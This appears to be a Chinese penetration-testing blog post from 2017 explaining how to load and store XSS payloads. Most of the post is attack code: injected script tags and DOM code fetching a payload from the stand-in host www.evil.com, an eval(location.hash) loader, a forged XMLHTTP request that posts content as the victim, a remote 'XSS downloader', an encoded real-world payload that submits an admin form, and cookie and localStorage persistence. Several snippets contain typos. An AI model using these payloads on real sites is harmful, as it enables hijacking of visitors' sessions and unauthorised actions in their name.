<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="hark"><title>XSS之shllcode的调用 | Bug'小虫</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">XSS之shllcode的调用</h1><a id="logo" href="/.">Bug'小虫</a><p class="description">走过黑暗，前面便是光</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">XSS之shllcode的调用</h1><div class="post-meta">Apr 3, 2017<span> | </span><span class="category"><a href="/categories/渗透/">渗透</a></span></div><div class="post-content"><p>1.动态调用远程JavaScript<br>假设<a href="http://www.bug.com是某个页面含有一个XSS漏洞,Exploit如下" target="_blank" rel="noopener">www.bug.com是某个页面含有一个XSS漏洞,Exploit如下</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=[Exploit]</span><br></pre></td></tr></table></figure></p>
<p>可以直接把Shellcode写到URL参数中,如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>方便起见可以把Shellcode写到其他服务器的文件上,然后在用<script>标签进行动态加载.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scriptsrc=http://www.evil.com/xss.js&gt; &lt;/script&gt;&lt;</span><br><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;scriptsrc=http://www.evil.com/xss.js&gt; &lt;/script&gt;&lt;</span><br></pre></td></tr></table></figure></p>
<p>除了使用<script>标签动态调用远程JavaScript,还可以运用基于DOM的方法创建和插入节点,<br>把脚本或HTML注入到网页,实现过程如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vars=document.creteElement(&quot;script&quot;);</span><br><span class="line">s.src=&quot;http://www.evil.com/xss.js&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(s);</span><br></pre></td></tr></table></figure></p>
<p>第一行代码使用createElement()函数创建一个新元素—script<br>第二行代码把<script>的src属性设置成”<a href="http://www.evil.com/xss.js&quot;,xss.js里面鞋油Shellcode代码">http://www.evil.com/xss.js&quot;,xss.js里面鞋油Shellcode代码</a>.<br>第三行代码使用GetElementsByTagName()函数查找并返回文档中第一个元素(因为索引为0),<br>然后利用appendChild()函数调用元素参数s,追加指定的节点到子节点列表的最后一个.<br>简单来说,这段脚本的作用就是动态创建了一个<script>标签,其src属性指向<a href="http://www.evil.com/xss.js.然后把引用JavaScript的代码插入到网页的">http://www.evil.com/xss.js.然后把引用JavaScript的代码插入到网页的</a><head>标签后</p>
<h3 id="2-使用window-location-hash"><a href="#2-使用window-location-hash" class="headerlink" title="2.使用window.location.hash"></a>2.使用window.location.hash</h3><p>如果仅仅是为了解决URL字符长度问题,还可以使用另一种方式实现Shellcode的存储和调用—利用window.location.hash属性.<br>location是JavaScript管理地址栏的内置对象,比如location.href用来管理页面的UTL,用location.href=url就可以直接将页面重定向URL,而location.hash则可以用来获取或设置页面的标签值.比如<a href="http://domain/#admin的location.hash=&quot;#admin&quot;,利用这个属性值可以做一件非常有意义的事情">http://domain/#admin的location.hash=&quot;#admin&quot;,利用这个属性值可以做一件非常有意义的事情</a>.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=[Exploit]</span><br></pre></td></tr></table></figure></p>
<p>如果结合location.hash的特性调用Shellcode,具体如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#alert(&apos;xss&apos;)</span><br></pre></td></tr></table></figure></p>
<p>其中substr()可在字符串中抽取从start下标(这里是1)开始的指定数目的字符,所以location.hash.substr(1)的作用是抽取”#”符号后面的字符,即alert(‘xss’).而eval()函数用来计算某个字符串,并执行其中的JavaScript代码,通过这个技巧,就能先把Shellcode写到地址参数中在执行.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bug.com/view.php?sort=&quot;&gt;&lt;script&gt;eval(location.hash.substr(1))&lt;/script&gt;#varurl=&quot;/index.php?mod=blog&amp;act=dopost&quot;;varcontent=&quot;blog_content=By%3A%E5%AD%A4&quot;;function_sd_Post(Url,Args)&#123;varxmlhttp;var error;eval(&apos;try &#123;xmlhttp=newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;catch(e)&#123;xmlhttp=null;error=e;&#125;&apos;);if(null!=xmlhttp)&#123;xmlhttp.Open(&quot;POST&quot;,Url,false);xmlhttp.setRequestHeader(&quot;x-requested-with&quot;,&quot;XMLHttpRequest&quot;);xmlhttp.setRequestHeader(&quot;Referer&quot;,&quot;http://www.my.com/api_proxy.html&quot;);xmlhttp.setRequestHeader(&quot;Accept&quot;,&quot;application/json,text/javascript,*/*&quot;);xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.setRequestHeader(&quot;Host&quot;,&quot;www.my.com&quot;);xmlhttp.Send(Args);StrText=xmlhttp.reponseText;&#125;&#125;_sd_Post(url,content);</span><br></pre></td></tr></table></figure></p>
<p>这个XSS Exploit还可以经过各种编码处理以加强迷惑性.</p>
<h3 id="3-XSSDownloader"><a href="#3-XSSDownloader" class="headerlink" title="3.XSSDownloader"></a>3.XSSDownloader</h3><p>另外一种存储和调用Shellcode的方法,即将其存储到网站的数据库中,包括网页信息、文章内容、个人资料等地方,然后再把他们下载下来执行.<br>简单地说,就是打造一个XSSdownloader(XSS下载器),事先把Shellcode写在网站的某个页面,在利用XMLHTTP控件向网站发送HTTP请求(POST或GET),然后执行返回的数据.<br>简单的POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">functionXSS()&#123;       /*定义一个XSS()函数,该函数就是调用Shellcode的主函数*/</span><br><span class="line">a=newActiveXObject(&apos;Microsoft.XMLHTTP&apos;);  /*创建一个XMLHTTP对象*/</span><br><span class="line">a.Open(&apos;get&apos;,&apos;http://www.bug.com/11221.html&apos;,false);</span><br><span class="line">a.send();           /*向11221.html发送一个HTTP请求并获取HTTP响应*/</span><br><span class="line">b=a.responseText;  /*获取responseText,结果返回为字符串,把该变量赋值给b变量*/</span><br><span class="line">eval(unescape(b.substring(b.indexOf(&apos;BOF|&apos;)+4,b.indexOf(&apos;|EOF&apos;))));</span><br><span class="line">                  /*用indexOf()函数计算BOF|和|EOF的位置,再用substring()函数方法取</span><br><span class="line">                  出字符串,最后用unescape()函数方法解码执行*/</span><br><span class="line">&#125;d()</span><br><span class="line"> </span><br><span class="line">http://www.bug.com/11221.html页面代码:</span><br><span class="line">Xx09abcxddxBOF|alert(/XSS/)|EOFxxx44xx1212</span><br></pre></td></tr></table></figure></p>
<p>真实XSS利用案例:<br>某网站同学录留言的贴图URL输入框处出现过XSS,主要是用onload事件来触发,Exploit如下:<br>在留言的贴图URL的输入框里填写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/editor/UploadFile/2006-12/2/2006122155124754.gif&quot;onload=&quot;var t=document.body.innerHTML;var s=t.indexOf(&apos;+++&apos;)+3;vare=t.indexOf(&apos;---&apos;);eval(unescape(t.substring(s,e)));&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>在留言框内填写:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++try%20%7B%0D%0A%09var%20as%20%3D%20document.getElementsByTagName%28%22a%22%29%3B%0D%0A%09var%20frm%20%3D%20document.getElementsByTagName%28%22iframe%22%29%5B0%5D%3B%0D%0A%09frm.onload%20%3D%20function%28%29%20%7B%0D%0A%09%09var%20oFrm%20%3D%20document.getElementsByTagName%28%22iframe%22%29%5B0%5D%3B%0D%0A%09%09oFrm.onload%20%3D%20%22%22%3B%0D%0A%09%09var%20oDoc%20%3D%20oFrm.contentWindow.document%3B%0D%0A%09%09oDoc.all%5B%22who%22%5D%5B1%5D.checked%20%3D%20true%3B%0D%0A%09%09oDoc.dealmember.action%20%3D%20%22backaction/UpdateClassMate.jsp%3Ff%3D1%22%3B%0D%0A%09%09oDoc.dealmember.submit%28%29%3B%0D%0A%09%7D%0D%0A%09frm.src%20%3D%20as%5B34%5D.href%3B%0D%0A%7D%20catch%20%28e%29%20%7B%0D%0A%09alert%28e%29%3B%0D%0A%7D---</span><br></pre></td></tr></table></figure></p>
<p>XSS代码触发后,会调用留言内容中的+++和—之间的部分代码,对这段代码解码后得到核心的Shellcode如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">var as =document.getElementsByTagName(&quot;a&quot;);</span><br><span class="line">var frm= document.getElementsByTagName(&quot;iframe&quot;)[0];</span><br><span class="line">frm.onload= function() &#123;</span><br><span class="line">var oFrm= document.getElementsByTagName(&quot;iframe&quot;)[0];</span><br><span class="line">oFrm.onload= &quot;&quot;;</span><br><span class="line">var oDoc= oFrm.contentWindow.document;</span><br><span class="line">oDoc.all[&quot;who&quot;][1].checked= true;</span><br><span class="line">oDoc.dealmember.action= &quot;backaction/UpdateClassMate.jsp?f=1&quot;;</span><br><span class="line">oDoc.dealmember.submit();</span><br><span class="line">&#125;</span><br><span class="line">frm.src= as[34].href;</span><br><span class="line">&#125; catch(e) &#123;</span><br><span class="line">alert(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>4.备选存储技术<br>随着XSS技术的不断发展,攻击者想出来越来越多巧妙的方法去存储和调用XSS Shellcode,较为新颖的方式是把XSS Shellcode存储在客户端本地域中,譬如HTTP cookie、Flash共享对象、UserData、localStorage等.<br>其中Cookie是客户存储技术中的传统解决方法,但是它有个明显的缺点,就是存储的容量有限,被限制在4KB内.</p>
<p>在Cookie中存储Shellcode的POC如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">functionsetShellCodz(codz)&#123;</span><br><span class="line">var exp=new Data();</span><br><span class="line">exp.setTime(exp.getTime()+365*24*60*60*1000);</span><br><span class="line">document.cookie=&apos;shellcode=&apos;+escape(codz)+&apos;;&apos;+&apos;expires=&apos;+exp.toGMTString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另一种存储容器是Flash共享对象(Shared Object,SO),类似于HTTP Cookie的运用方式,所以也被称作Flash Cookie.<br>与普通Cookie的4KB限制不同,SO存储最大可达100KB,并且可以使用任何形式的JS对象,缺点是必须要使用Flash软件.</p>
<p>除了以上两种Cookie,还可以使用IE的UserData存储XSS Shellcode.UserData是微软专门为IE在系统中开辟的一块存储空间,最少能支持64KB,不足之处是只能在IE浏览器上使用.</p>
<p>另外,HTML5也提供了两种在客户端存储数据的新方法,包括localStorage和sessionStorage,其用法基本相同.以localStorage为例，存储数据的方法是直接给window．localStorage添加一个属性,如:window.localStorage.a或者window.localStorage[“a”]<br>它的读取、写入、删除操作方法很简单,是以键值对的方式存在的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">localStorage.a=&quot;xss&quot;;</span><br><span class="line">document.write(localStorage.a);</span><br><span class="line">if (localStorage.count)</span><br><span class="line"> &#123;</span><br><span class="line"> localStorage.count=Number(localStorage.count)+1;</span><br><span class="line"> &#125;</span><br><span class="line">else</span><br><span class="line"> &#123;</span><br><span class="line"> localStorage.count=1;</span><br><span class="line"> &#125;</span><br><span class="line">document.write(&quot;访问次数&quot;+localStorage.count+ &quot; time(s) .&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>这段代码会创建一个变量a,并把XSS存储进去,然后把相关信息打印出来.<br>需要支持HTML5的浏览器才能看到效果.<br>xss访问次数1 time(s) .      xss访问次数2time(s) .</p>
<p>如果要把XSS Shellcode存储在localStorage中,操作如下:</p>
<p>保存Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">functionsetShellCodz(codz)&#123;</span><br><span class="line">window.localStorage.setItem(&quot;shellcodz&quot;,codz);&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行Shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">functiongetShellCodz()&#123;</span><br><span class="line">eval(window.localStorage.getItem(&quot;shellcodz&quot;));&#125;</span><br></pre></td></tr></table></figure></p>
</script></p></div><div class="tags"><a href="/tags/XSS/">XSS</a></div><div class="post-nav"><a class="pre" href="/2017/04/10/对一个赛马网站进行的体检/">对一个赛马网站进行的体检</a><a class="next" href="/2017/04/03/在linux利用github和hexo搭建属于自己的博客/">在linux利用github和hexo搭建属于自己的博客</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/herly/">herly</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权/">提权</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/windows/" style="font-size: 15px;">windows</a> <a href="/tags/其他/" style="font-size: 15px;">其他</a> <a href="/tags/注入/" style="font-size: 15px;">注入</a> <a href="/tags/javascript/" style="font-size: 15px;">javascript</a> <a href="/tags/parrot/" style="font-size: 15px;">parrot</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/工具/" style="font-size: 15px;">工具</a> <a href="/tags/资源/" style="font-size: 15px;">资源</a> <a href="/tags/其它/" style="font-size: 15px;">其它</a> <a href="/tags/Windows2003/" style="font-size: 15px;">Windows2003</a> <a href="/tags/windows提权/" style="font-size: 15px;">windows提权</a> <a href="/tags/rad-linux/" style="font-size: 15px;">rad linux</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/关于本博客/">关于本博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/vim常用命令总结/">vim常用命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/PHP手工注入笔记 /">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/mysql手工注入之load_file()应用/">mysql手工注入之load_file()应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/28/渗透过程中总结的一些技巧/">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/htaccess配合apache 提权/">htaccess配合apach提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/保证session不被服务器因超时注销/">即可保证session不被服务器因超时注销</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/17/linxu安装wps后无法启动的问题解决方法/">linxu安装wps后无法启动的问题解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/28/绕过XSS-Filter及其它一些XSS构造方法/">绕过XSS-Filter</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">Bug'小虫.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>